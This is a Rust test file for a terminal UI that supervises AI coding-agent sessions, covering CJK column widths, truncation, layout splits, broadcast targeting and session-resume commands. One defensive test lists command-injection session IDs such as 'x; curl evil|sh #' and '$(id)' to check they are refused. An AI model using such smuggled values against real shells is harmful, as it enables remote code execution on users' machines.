// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 ORASCOPE Co.,Ltd. (https://www.orascope.net)

//! The half of the screen that needs no screen: widths, cuts, badges, ordering.
//!
//! Each of these would otherwise be checkable only by rendering everything to
//! a string and searching it; here each is a function that takes values and
//! returns one.

mod common;

use common::{agent, at};
use ratatui::style::{Color, Style};
use ratatui::text::{Line, Span};
use std::collections::HashMap;
use time::Duration;
use tower_state::{Agent, AgentState};
use tower_ui::view::{list_window, split_body, state_label};
use tower_ui::{
    clamp_line, line_text, pad_right, render_info, resume_command, since, targets, title_case,
    truncate_width, unit_word_for, InfoData, ResumePaths,
};
use tower_wiring::Info as Wiring;
use unicode_width::UnicodeWidthStr;

/// The shear this guards against: Korean characters take two terminal columns,
/// so padding by character count leaves the table crooked exactly when a task
/// description is in Korean — which, in this tower, is always.
#[test]
fn padding_counts_columns_not_characters() {
    assert_eq!(
        tower_text::width("승인 대기"),
        9,
        "4 CJK characters and a space"
    );
    assert_eq!(tower_text::width(&pad_right("승인 대기", 20)), 20);
    assert_eq!(tower_text::width(&pad_right("abcdefghi", 20)), 20);
    // Wider than the cell: left alone. A caller that wanted a cut asks for one.
    assert_eq!(pad_right("핸드오프 문서 확인", 4), "핸드오프 문서 확인");
}

/// The ellipsis is paid for out of the budget, not added on top of it.
///
/// Assuming it costs one column is the version that overflows the moment
/// somebody uses a wide ellipsis — and under a CJK locale some width tables say
/// `…` is two.
#[test]
fn truncation_pays_for_its_own_ellipsis() {
    let long = "가".repeat(30); // 60 columns
    let cut = truncate_width(&long, 28, "…");
    assert!(
        tower_text::width(&cut) <= 28,
        "cut to {} columns",
        tower_text::width(&cut)
    );
    assert!(cut.ends_with('…'));
    assert_eq!(truncate_width("짧다", 28, "…"), "짧다");
    // An empty tail is the preview's case: cut, no marker.
    assert!(!truncate_width(&long, 10, "").ends_with('…'));
}

#[test]
fn elapsed_time_is_coarse() {
    assert_eq!(since(at(0), at(0)), "just now");
    assert_eq!(since(at(0), at(5)), "5m");
    assert_eq!(since(at(0), at(120)), "2h");
    assert_eq!(since(at(0), at(60 * 24 * 3)), "3d");
}

#[test]
fn title_case_only_touches_the_first_character() {
    assert_eq!(title_case("claude"), "Claude");
    assert_eq!(title_case("antigravity"), "Antigravity");
    // `strings.Title` would have made this `Antigravity_V2`.
    assert_eq!(title_case("antigravity_v2"), "Antigravity_v2");
    assert_eq!(title_case(""), "");
}

/// A line that overflows the terminal wraps, and a wrapped line pushes the rest
/// of an alternate-screen layout off the bottom. Nothing may exceed the width.
#[test]
fn a_clamped_line_never_exceeds_the_width_even_in_korean() {
    let line = Line::from(vec![Span::raw("가".repeat(40))]);
    for width in 1..=30 {
        let cut = clamp_line(&line, width);
        assert!(
            tower_ui::line_width(&cut) <= width,
            "width {width}: got {} columns",
            tower_ui::line_width(&cut)
        );
    }
    // A wide character straddling the boundary must not leave the line short of
    // the edge either: 20 columns of 2-wide text plus an ellipsis lands exactly.
    assert_eq!(tower_ui::line_width(&clamp_line(&line, 20)), 20);
}

/// A cut keeps the style of what it kept, and the ellipsis wears the style of
/// the span it interrupted.
///
/// With colour baked into the string, a `\x1b[0m` would have to be appended by
/// hand at every cut, or an open colour would bleed down the rest of the
/// screen. Style beside the text removes the failure mode; what is left is only
/// that the marker should not look like it belongs to the next span.
#[test]
fn clamping_keeps_the_styles_of_what_it_kept() {
    let red = Style::default().fg(Color::Red);
    let line = Line::from(vec![
        Span::styled("keep", Style::default().fg(Color::Green)),
        Span::styled("가나다라마바사", red),
    ]);
    let cut = clamp_line(&line, 8);
    assert!(tower_ui::line_width(&cut) <= 8);
    assert_eq!(cut.iter().next().unwrap().style.fg, Some(Color::Green));
    assert_eq!(
        cut.iter().last().unwrap().style.fg,
        Some(Color::Red),
        "the ellipsis belongs to the span it interrupted"
    );
    // Under the width, untouched.
    let short = Line::from(Span::raw("짧은 줄"));
    assert_eq!(line_text(&clamp_line(&short, 20)), "짧은 줄");
}

/// Every state cell is the same width, so the columns to its right line up on
/// every row.
///
/// `● active?` is one column wider than `● active`, so a label written into the row
/// unpadded would shear the table on exactly the rows that mark a lost hook,
/// which are the rows the label exists to draw attention to.
#[test]
fn every_state_cell_is_the_same_width() {
    let mut widths = Vec::new();
    for state in [
        AgentState::Working,
        AgentState::Waiting,
        AgentState::DoneUnread,
        AgentState::Error,
        AgentState::Idle,
        AgentState::Dead,
    ] {
        let a = agent("x", "claude", "s", state);
        widths.push(state_label(&a, at(1)).width());
    }
    let mut stale = Agent::new("x", "claude", at(0));
    stale.state = AgentState::Working;
    stale.updated_at = at(0);
    assert_eq!(
        state_label(&stale, at(60)),
        "? working",
        "a lost hook is marked"
    );
    widths.push(state_label(&stale, at(60)).width());

    assert!(
        widths.windows(2).all(|w| w[0] == w[1]),
        "state cells differ in width: {widths:?}"
    );
}

// ── list geometry ────────────────────────────────────────────────────────

/// Whatever the list length and wherever the cursor is, the highlighted row is
/// on screen and the window fits.
#[test]
fn the_cursor_is_always_inside_the_visible_window() {
    for len in [1usize, 2, 7, 20, 200] {
        for height in [1usize, 3, 4, 10, 25] {
            for cursor in [0, len / 2, len.saturating_sub(1)] {
                let w = list_window(len, cursor, height);
                let shown = (w.end - w.start) + usize::from(w.above > 0) + usize::from(w.below > 0);
                assert!(
                    shown <= height,
                    "len={len} height={height} cursor={cursor}: {shown} rows drawn"
                );
                assert!(
                    w.start <= cursor && cursor < w.end.max(1),
                    "len={len} height={height} cursor={cursor}: window {w:?} loses the cursor"
                );
                assert!(w.end <= len);
            }
        }
    }
}

/// A tower that hides agents to show a screenshot of one of them has its
/// priorities backwards.
#[test]
fn the_preview_yields_to_the_list_when_the_list_needs_the_room() {
    // Plenty of room: the preview takes everything the list leaves (no dot
    // lines any more — the list meets the preview's heading band directly).
    assert_eq!(split_body(30, 5, true), (5, 25));
    // Just enough rows to matter (a rule plus three lines).
    assert_eq!(split_body(9, 5, true), (5, 4));
    // Not enough to be worth drawing.
    assert_eq!(split_body(8, 5, true), (8, 0));
    // The list itself does not fit; there is nothing to spare.
    assert_eq!(split_body(4, 20, true), (4, 0));
    // Nothing captured.
    assert_eq!(split_body(30, 5, false), (30, 0));
    // Capped, so the preview never becomes the screen.
    let (_, preview) = split_body(300, 1, true);
    assert!(preview <= 41, "preview took {preview} rows");
}

/// At every body height and list length, the split hands out exactly the
/// rows it was given; a preview, when there is one, is at least a rule and
/// three lines and at most the cap; and the list keeps every one of its rows
/// plus any separator rows ([`PREVIEW_RULES`], none now) — so a taller screen never
/// shrinks the preview, and the preview never costs the list a row.
#[test]
fn the_preview_split_holds_at_every_height() {
    use tower_ui::view::PREVIEW_RULES;
    for rows in 0..120 {
        let mut last = 0;
        for body in 0..160 {
            assert_eq!(split_body(body, rows, false), (body, 0), "{body} {rows}");
            let (list, preview) = split_body(body, rows, true);
            let at = format!("body {body} rows {rows}: ({list}, {preview})");
            assert_eq!(list + preview, body, "{at}");
            // Shown exactly when the list, the separator rows and the
            // smallest useful preview all fit.
            assert_eq!(preview > 0, body >= rows + PREVIEW_RULES + 4, "{at}");
            if preview > 0 {
                assert!((4..=41).contains(&preview), "{at}");
                assert!(list >= rows + PREVIEW_RULES, "{at}");
            }
            assert!(preview >= last, "a taller body shrank the preview: {at}");
            last = preview;
        }
    }
}

// ── broadcast targets ────────────────────────────────────────────────────

/// A broadcast that reaches the tower's own pane instructs the tower.
#[test]
fn targets_skip_the_towers_own_pane_and_the_dead() {
    let agents = vec![
        agent("claude-1", "claude", "a", AgentState::Idle),
        agent("codex-2", "codex", "b", AgentState::Waiting),
        agent("claude-3", "claude", "c", AgentState::Dead),
        agent("shell-4", "shell", "d", AgentState::Idle),
    ];
    let picked: Vec<&str> = targets(&agents, Some("p-codex-2"))
        .iter()
        .map(|a| a.id.as_str())
        .collect();
    assert_eq!(
        picked,
        vec!["claude-1"],
        "dead rows, unsupervised kinds and the tower's own pane are all skipped"
    );
    // With no pane of its own to skip — the tower running outside the backend —
    // every live supervised agent is a target.
    assert_eq!(targets(&agents, None).len(), 2);
}

/// DEAD is the only state left out, and each of the others is in.
///
/// Every state but DEAD is a session somebody can still type into, so a
/// close-everything that skipped the working or the erroring ones would leave
/// running exactly the sessions the person meant to shut down — and a wake that
/// skipped WAITING would miss the ones stuck at a prompt, which is the reason
/// the key exists. Only DEAD was ever pinned, so a narrower liveness test would
/// have gone unnoticed here.
#[test]
fn a_broadcast_reaches_every_state_but_dead() {
    for state in [
        AgentState::Working,
        AgentState::Waiting,
        AgentState::DoneUnread,
        AgentState::Idle,
        AgentState::Error,
    ] {
        let agents = vec![agent("claude-1", "claude", "a", state)];
        let picked: Vec<&str> = targets(&agents, None)
            .iter()
            .map(|a| a.id.as_str())
            .collect();
        assert_eq!(picked, vec!["claude-1"], "{state:?} is still a session");
    }
    let dead = vec![agent("claude-1", "claude", "a", AgentState::Dead)];
    assert!(
        targets(&dead, None).is_empty(),
        "a DEAD record is recovery data, not a pane to write to"
    );
}

/// Two panes a broadcast must not write to: one it cannot name, and its own.
///
/// A record with no pane ID names no pane — a write addressed to it goes
/// wherever an empty target resolves, which is whatever pane the backend had in
/// hand. And the tower's own pane is named in the backend's own vocabulary,
/// backend and pane together: the same pane ID under a different backend is a
/// different pane, and excluding it on the bare ID would silence a real agent.
#[test]
fn a_broadcast_skips_a_pane_it_cannot_name_and_its_own() {
    let mut nameless = agent("claude-1", "claude", "a", AgentState::Idle);
    nameless.pane.pane_id = String::new();
    let mut remote = agent("claude-2", "claude", "b", AgentState::Idle);
    remote.pane.backend = "b0123456789abcdef".into();
    let agents = vec![nameless, remote];

    let picked = |self_pane: Option<&str>| -> Vec<String> {
        targets(&agents, self_pane)
            .iter()
            .map(|a| a.id.clone())
            .collect()
    };
    assert_eq!(picked(None), ["claude-2"], "a record with no pane ID");
    assert_eq!(
        picked(Some("b0123456789abcdef:p-claude-2")),
        Vec::<String>::new(),
        "the tower's own pane, named the way the backend names it"
    );
    assert_eq!(
        picked(Some("p-claude-2")),
        ["claude-2"],
        "that pane ID without the backend is another backend's pane"
    );
}

/// Cross validation over every combination of the three things that decide a
/// target — kind, state, and whether there is a pane to write to — against the
/// fields read directly, in place of the filters. The order is the list's own:
/// the receipt names the sessions a broadcast reached, and a reordered list
/// makes that receipt match a different row than the one that was written to.
#[test]
fn the_broadcast_list_is_every_addressable_live_supervised_record_in_order() {
    let mut agents: Vec<Agent> = Vec::new();
    let mut want: Vec<String> = Vec::new();
    for (n, kind) in ["claude", "codex", "gemini", "shell", "", "claude-code"]
        .iter()
        .enumerate()
    {
        for (m, state) in [
            AgentState::Working,
            AgentState::Waiting,
            AgentState::DoneUnread,
            AgentState::Idle,
            AgentState::Error,
            AgentState::Dead,
        ]
        .iter()
        .enumerate()
        {
            for paned in [true, false] {
                let id = format!("r{n}{m}{}", u8::from(paned));
                let mut a = agent(&id, kind, "s", *state);
                if !paned {
                    a.pane.pane_id = String::new();
                }
                // Read off the record itself, not through `is_live` or the kind
                // filter: a supervised engine, a state that is not DEAD, and a
                // pane to address.
                let supervised = *kind == "claude" || *kind == "codex" || *kind == "gemini";
                if supervised && *state != AgentState::Dead && paned {
                    want.push(id);
                }
                agents.push(a);
            }
        }
    }
    let got: Vec<String> = targets(&agents, None)
        .iter()
        .map(|a| a.id.clone())
        .collect();
    assert_eq!(got.len(), 15, "3 engines × 5 live states × a named pane");
    assert_eq!(got, want);
}

// ── resume ───────────────────────────────────────────────────────────────

/// Each CLI hides its conversation ID somewhere else, and the reason a revival
/// is impossible has to reach the user as a sentence.
#[test]
fn a_revival_needs_a_conversation_to_revive() {
    let home = tempfile::tempdir().unwrap();
    let paths = ResumePaths::under(home.path());

    let mut claude = agent("claude-1", "claude", "s", AgentState::Dead);
    assert!(resume_command(&claude, &paths).is_err(), "no session_id");
    claude.session_id = "sid-20".into();
    assert_eq!(
        resume_command(&claude, &paths).unwrap(),
        "claude --resume 'sid-20'"
    );

    let mut codex = agent("codex-1", "codex", "s", AgentState::Dead);
    assert!(resume_command(&codex, &paths).is_err(), "no folder");
    codex.cwd = "/w/app".into();
    assert!(
        resume_command(&codex, &paths)
            .unwrap_err()
            .contains("rollout"),
        "no rollout names that folder"
    );

    let mut gemini = agent("gemini-1", "gemini", "s", AgentState::Dead);
    gemini.session_id = "conv-9".into();
    assert!(
        resume_command(&gemini, &paths)
            .unwrap_err()
            .contains("stock Gemini CLI"),
        "the stock CLI cannot resume, and only a brain folder says which it is"
    );
    std::fs::create_dir_all(
        home.path()
            .join(".gemini")
            .join("antigravity-cli")
            .join("brain")
            .join("conv-9"),
    )
    .unwrap();
    assert_eq!(
        resume_command(&gemini, &paths).unwrap(),
        "agy --conversation 'conv-9'"
    );

    let other = agent("shell-1", "shell", "s", AgentState::Dead);
    assert!(resume_command(&other, &paths).is_err());
}

/// The stored-command attack from #28: a session ID that is a shell command is
/// refused for every kind — a record written before the hooks checked, or by
/// hand, never becomes a command typed into the user's shell.
#[test]
fn a_session_id_that_is_a_shell_command_is_refused_for_every_kind() {
    let home = tempfile::tempdir().unwrap();
    let paths = ResumePaths::under(home.path());
    let brain = home.path().join(".gemini/antigravity-cli/brain");
    std::fs::create_dir_all(&brain).unwrap();
    for evil in ["x; curl evil|sh #", "$(id)", "a b", "../brain", "-x"] {
        // Present for the gemini case, so only the check can refuse it.
        let _ = std::fs::create_dir_all(brain.join(evil));
        for kind in ["claude", "codex", "gemini", "opencode"] {
            let mut a = agent("x-1", kind, "s", AgentState::Dead);
            a.session_id = evil.into();
            let err = resume_command(&a, &paths).unwrap_err();
            assert!(err.contains("not a session ID"), "{kind} {evil:?}: {err}");
        }
    }
}

/// Examples: a valid ID is quoted as one word for every kind, and blanks
/// recorded around it are not part of it.
#[test]
fn a_valid_session_id_is_typed_as_one_quoted_word() {
    let home = tempfile::tempdir().unwrap();
    let paths = ResumePaths::under(home.path());
    std::fs::create_dir_all(home.path().join(".gemini/antigravity-cli/brain/c-1")).unwrap();
    for (kind, want) in [
        ("claude", "claude --resume 'c-1'"),
        ("codex", "codex resume 'c-1'"),
        ("gemini", "agy --conversation 'c-1'"),
        ("opencode", "opencode --session 'c-1'"),
    ] {
        let mut a = agent("x-1", kind, "s", AgentState::Dead);
        a.session_id = " c-1\n".into();
        assert_eq!(resume_command(&a, &paths).unwrap(), want, "{kind}");
    }
}

/// A `/rename` label is recoverable, which is the whole reason the row may
/// cover it with the terminal title.
///
/// The card rendered the question and the task and never the name, so a pane
/// with both a label and a title had its label appear nowhere in the tower at
/// all — the fallback the row's order is justified by did not exist.
#[test]
fn the_card_says_the_name_somebody_gave_the_pane() {
    let mut a = agent("claude-1", "claude", "s", AgentState::Working);
    a.label = "dbeaver".into();
    a.title = "2550 pg_stat_activity".into();
    a.state_since = at(0);
    a.updated_at = at(0);

    let labels = HashMap::new();
    let card = render_info(
        &InfoData {
            agent: &a,
            wiring: &Wiring::default(),
            ctx: None,
            branch: None,
            labels: &labels,
            unit: unit_word_for("macos"),
        },
        at(0),
    );
    assert_eq!(
        a.headline(),
        "2550 pg_stat_activity",
        "the row is covering the name, which is what makes this necessary"
    );
    let line = card
        .lines()
        .find(|l| l.trim_start().starts_with("name "))
        .unwrap_or_else(|| panic!("the card has no name line:\n{card}"));
    assert_eq!(line.trim_end(), "  name       dbeaver");

    // An unnamed pane gets no empty row.
    a.label.clear();
    let card = render_info(
        &InfoData {
            agent: &a,
            wiring: &Wiring::default(),
            ctx: None,
            branch: None,
            labels: &labels,
            unit: unit_word_for("macos"),
        },
        at(0),
    );
    assert!(
        !card.lines().any(|l| l.trim_start().starts_with("name ")),
        "{card}"
    );
}

/// The state line composes a preposition with a span, and the sub-minute case is
/// the one that breaks: `since` would make it "for just now" and `age` "for just
/// now ago". Nothing in `expected/info.txt` is under a minute, so without this
/// the composition could be swapped back and every other test would still pass.
#[test]
fn a_state_a_few_seconds_old_reads_as_a_length_not_a_moment() {
    let mut a = agent("claude-1", "claude", "s", AgentState::Working);
    let now = at(0) + Duration::seconds(30);
    a.state_since = at(0);
    a.updated_at = at(0);

    let labels = HashMap::new();
    let card = render_info(
        &InfoData {
            agent: &a,
            wiring: &Wiring::default(),
            ctx: None,
            branch: None,
            labels: &labels,
            unit: unit_word_for("macos"),
        },
        now,
    );
    let line = card
        .lines()
        .find(|l| l.trim_start().starts_with("state "))
        .expect("the card has a state line");
    assert_eq!(
        line.trim_end(),
        "  state      WORKING for <1m (updated just now)"
    );
}

/// The card's session line shows the same eight characters the screen's SID
/// column does, and names the record `resume` wants.
///
/// The card used to shorten the ID itself — twelve characters kept whole, or
/// eight and an ellipsis — so the card and the column disagreed about what to
/// call one session, and a UUIDv7 (codex's) showed the eight characters of a
/// clock that all its workers share. Blanks are not an ID either: printed raw,
/// a recorded trailing newline split the card in two, and the `→ if it dies`
/// advice was offered for a session that has none.
#[test]
fn the_cards_session_line_shows_the_id_the_screen_shows() {
    let home = tempfile::tempdir().unwrap();
    let paths = ResumePaths::under(home.path());
    let labels = HashMap::new();
    let card = |sid: &str| {
        let mut a = agent("claude-1", "claude", "s", AgentState::Working);
        a.session_id = sid.into();
        let text = render_info(
            &InfoData {
                agent: &a,
                wiring: &Wiring::default(),
                ctx: None,
                branch: None,
                labels: &labels,
                unit: unit_word_for("macos"),
            },
            at(0),
        );
        (a, text)
    };

    let none = "  session    none yet (filled in when a hook fires)";
    let cases: [(&str, &str); 6] = [
        // A random UUID — claude's: the head tells it apart.
        (
            "c376295e-95bf-45d2-9cd0-e26b0e837218",
            "  session    c376295e → if it dies: herdr-tower resume claude-1",
        ),
        // A UUIDv7 — codex's: its head is a millisecond clock, so the random
        // tail is what tells two workers apart.
        (
            "01a0b8e0-9917-7af1-b920-ab518ce5d454",
            "  session    8ce5d454 → if it dies: herdr-tower resume claude-1",
        ),
        // Blanks around the ID are not part of it.
        (
            "  c376295e-95bf-45d2-9cd0-e26b0e837218\n",
            "  session    c376295e → if it dies: herdr-tower resume claude-1",
        ),
        // Shorter than eight characters: all of it.
        (
            "sid-20",
            "  session    sid-20 → if it dies: herdr-tower resume claude-1",
        ),
        // Blanks only, and nothing at all: no ID to show.
        ("   ", none),
        ("", none),
    ];
    for (sid, want) in cases {
        let (_, text) = card(sid);
        let lines: Vec<&str> = text
            .lines()
            .filter(|l| l.trim_start().starts_with("session "))
            .collect();
        assert_eq!(lines.len(), 1, "one session line for {sid:?}:\n{text}");
        assert_eq!(lines[0].trim_end(), want, "for {sid:?}");
    }

    // Round trip: the advice is actionable — the record the line names is the
    // one `resume` revives, whose command carries the whole ID the card does
    // not show.
    let (a, text) = card("c376295e-95bf-45d2-9cd0-e26b0e837218");
    let named = text
        .lines()
        .find_map(|l| {
            l.trim_end()
                .strip_prefix("  session    c376295e → if it dies: ")
        })
        .expect("the session line offers a resume");
    assert_eq!(named, format!("herdr-tower resume {}", a.id));
    assert_eq!(
        resume_command(&a, &paths).unwrap(),
        "claude --resume 'c376295e-95bf-45d2-9cd0-e26b0e837218'"
    );
}

/// A selection over display columns takes the characters that start inside
/// them: a Korean syllable is two columns wide and belongs to the first.
#[test]
fn columns_are_display_columns_not_characters() {
    use tower_ui::columns;
    assert_eq!(columns("abcdef", 1..4), "bcd");
    assert_eq!(columns("세션 id", 0..4), "세션");
    assert_eq!(columns("세션 id", 2..5), "션 ");
    assert_eq!(
        columns("세션 id", 1..2),
        "",
        "the second half of a wide character"
    );
    assert_eq!(columns("short", 3..99), "rt");
    assert_eq!(columns("", 0..3), "");
}

/// A height the person chose is honoured even when the list does not fit,
/// is not held to the automatic cap, and stays between a useful preview and
/// a list that can still be steered.
#[test]
fn a_chosen_preview_height_wins_within_bounds() {
    use tower_ui::view::{split_sized, LIST_KEEPS_SIZED};
    assert_eq!(split_sized(30, 100, true, Some(12)), (18, 12));
    assert_eq!(
        split_sized(100, 1, true, Some(60)),
        (40, 60),
        "past the automatic cap"
    );
    assert_eq!(
        split_sized(30, 5, true, Some(1)),
        (26, 4),
        "at least a heading and three lines"
    );
    assert_eq!(
        split_sized(30, 5, true, Some(99)),
        (LIST_KEEPS_SIZED, 30 - LIST_KEEPS_SIZED)
    );
    assert_eq!(split_sized(6, 5, true, Some(4)), (6, 0), "no room for both");
    assert_eq!(
        split_sized(30, 5, false, Some(12)),
        (30, 0),
        "nothing captured"
    );
    assert_eq!(split_sized(30, 5, true, None), split_body(30, 5, true));
}

/// The thumb is the window's share of the list and sits where the window
/// does; a list that fits has no bar.
#[test]
fn the_scrollbar_tracks_the_window() {
    use tower_ui::view::{scrollbar, ListWindow};
    let w = |start, end| ListWindow {
        start,
        end,
        above: 0,
        below: 0,
    };
    assert!(scrollbar(10, w(0, 10)).is_empty());
    let top = scrollbar(40, w(0, 10));
    assert_eq!(top.len(), 10);
    assert_eq!(top.iter().filter(|c| **c == Some(true)).count(), 2);
    assert_eq!(top[0], Some(true));
    let bottom = scrollbar(40, w(30, 40));
    assert_eq!(bottom[9], Some(true));
    assert_eq!(bottom[0], Some(false));
    // Never thinner than a row.
    assert_eq!(
        scrollbar(1000, w(500, 505))
            .iter()
            .filter(|c| **c == Some(true))
            .count(),
        1
    );
}

/// The preview heading's rule carries the fold mark again in the middle of
/// the screen and at its right end.
#[test]
fn the_fold_rule_marks_the_middle_and_the_end() {
    use tower_ui::view::fold_rule;
    // Text up to column 10 of 40: the mark on column 20 and in the last three.
    let rule = fold_rule(10, 40, '▼');
    assert_eq!(rule.chars().count(), 30);
    assert_eq!(rule, format!("{} ▼ {} ▼ ", "═".repeat(9), "═".repeat(15)));
    assert_eq!(fold_rule(10, 40, '▲').matches('▲').count(), 2);
    // Text past the middle: only the end is marked.
    assert_eq!(fold_rule(25, 40, '▼'), format!("{} ▼ ", "═".repeat(12)));
    // Too little room for even the end mark: a plain rule, as before.
    assert_eq!(fold_rule(37, 40, '▼'), "═══");
    assert_eq!(fold_rule(40, 40, '▼'), "");
    assert_eq!(fold_rule(50, 40, '▼'), "");
}

/// At every width and text length the rule fills the line exactly, and each
/// mark keeps a `═` between it and the text and the other mark.
#[test]
fn the_fold_rule_fills_the_line_and_keeps_its_marks_apart() {
    use tower_ui::view::fold_rule;
    for width in 0..120 {
        for from in 0..=width {
            let rule: Vec<char> = fold_rule(from, width, '▼').chars().collect();
            assert_eq!(rule.len(), width - from, "{from}/{width}");
            for (i, c) in rule.iter().enumerate() {
                if *c == '▼' {
                    assert_eq!(rule[i - 1], ' ', "{from}/{width}");
                    assert_eq!(rule[i + 1], ' ', "{from}/{width}");
                    assert!(i >= 2 && rule[i - 2] == '═', "{from}/{width}: {rule:?}");
                }
            }
            assert!(rule.iter().filter(|c| **c == '▼').count() <= 2);
        }
    }
}

/// Round trip: taking the marks back out leaves the plain rule, and the
/// open and folded rules differ only in the mark — the two never move
/// differently between a click and the next frame.
#[test]
fn the_fold_rule_is_the_plain_rule_with_marks_set_in() {
    use tower_ui::view::fold_rule;
    for width in 0..150 {
        for from in (0..=width).step_by(7) {
            let open = fold_rule(from, width, '▼');
            let folded = fold_rule(from, width, '▲');
            assert_eq!(open.replace(" ▼ ", "═══"), "═".repeat(width - from));
            assert_eq!(folded.replace('▲', "▼"), open, "{from}/{width}");
        }
    }
}

/// A drag measures from the handle: up grows the preview, down shrinks it,
/// and the remembered height never leaves the bounds a screen could draw.
#[test]
fn a_split_handle_turns_a_drag_into_a_height() {
    use tower_ui::view::SplitHandle;
    let h = SplitHandle {
        row: 20,
        preview_h: 10,
        body_h: 30,
        auto_opens: true,
    };
    assert_eq!(h.dragged_to(15), 15);
    assert_eq!(h.dragged_to(24), 6);
    assert_eq!(h.dragged_to(39), 4);
    assert_eq!(h.dragged_to(0), 27);
}

/// Every window, not just the ends: one bar cell per visible row, a single
/// unbroken thumb at least a row long, which only ever moves down as the
/// window does, starts flush at the top, ends flush at the bottom, and sits
/// within half a row of the exact proportional position.
#[test]
fn the_scrollbar_holds_for_every_window() {
    use tower_ui::view::{scrollbar, ListWindow};
    assert!(scrollbar(0, list_window(0, 0, 10)).is_empty());
    for len in 1..60usize {
        for shown in 1..len {
            let hidden = len - shown;
            let mut last_at = 0;
            for start in 0..=hidden {
                let w = ListWindow {
                    start,
                    end: start + shown,
                    above: start,
                    below: hidden - start,
                };
                let bar = scrollbar(len, w);
                assert_eq!(bar.len(), shown, "len {len} window {w:?}");
                assert!(bar.iter().all(Option::is_some));
                let thumb: Vec<usize> = (0..shown).filter(|&i| bar[i] == Some(true)).collect();
                let (at, size) = (thumb[0], thumb.len());
                assert_eq!(
                    thumb,
                    (at..at + size).collect::<Vec<_>>(),
                    "unbroken thumb, len {len} window {w:?}"
                );
                assert!(at >= last_at, "thumb moved up, len {len} window {w:?}");
                last_at = at;
                if start == 0 {
                    assert_eq!(at, 0);
                }
                if start == hidden {
                    assert_eq!(at + size, shown);
                }
                let travel = shown - size;
                assert!(
                    (2 * at * hidden).abs_diff(2 * travel * start) <= hidden,
                    "thumb off its place, len {len} window {w:?}"
                );
            }
        }
    }
}

/// Every body, list length and choice splits the body without losing a row;
/// a drawn preview is never shorter than useful; a chosen one leaves the list
/// room to steer, grows with the choice, and choosing what was drawn draws
/// the same thing again.
#[test]
fn the_split_never_loses_a_row() {
    use tower_ui::view::{split_sized, LIST_KEEPS_SIZED, PREVIEW_MIN, PREVIEW_RULES};
    for body in 0..70usize {
        for rows in 0..70usize {
            for chosen in std::iter::once(None).chain((0..90).map(Some)) {
                let (list, preview) = split_sized(body, rows, true, chosen);
                if preview == 0 {
                    assert_eq!(list, body);
                    continue;
                }
                assert_eq!(list + preview + PREVIEW_RULES, body);
                assert!(preview >= PREVIEW_MIN);
                if chosen.is_some() {
                    assert!(list >= LIST_KEEPS_SIZED, "body {body} chosen {chosen:?}");
                    assert_eq!(
                        split_sized(body, rows, true, Some(preview)),
                        (list, preview)
                    );
                }
            }
            let mut last = 0;
            for chosen in 0..90 {
                let (_, preview) = split_sized(body, rows, true, Some(chosen));
                assert!(preview >= last, "body {body} chosen {chosen}");
                last = preview;
            }
        }
    }
}

/// A handle drawn from a split gives that split back when let go where it
/// was picked up, and wherever it is let go, the height it remembers is one
/// the split draws unchanged — never a number it would quietly clamp. Lower
/// drops never ask for more.
#[test]
fn a_split_handle_round_trips_through_the_split() {
    use tower_ui::view::{split_sized, SplitHandle, LIST_KEEPS_SIZED, PREVIEW_MIN};
    const HEADER: usize = 2;
    for body in LIST_KEEPS_SIZED + PREVIEW_MIN..60 {
        for chosen in 0..80 {
            let (list, preview) = split_sized(body, 100, true, Some(chosen));
            let h = SplitHandle {
                row: HEADER + list,
                preview_h: preview,
                body_h: body,
                auto_opens: false,
            };
            assert_eq!(h.dragged_to(h.row), preview, "body {body} chosen {chosen}");
            let mut last = usize::MAX;
            for to in 0..HEADER + body + 5 {
                let asked = h.dragged_to(to);
                assert_eq!(
                    split_sized(body, 100, true, Some(asked)).1,
                    asked,
                    "body {body} drop at {to}"
                );
                assert!(asked <= last, "body {body} drop at {to}");
                last = asked;
            }
        }
    }
}
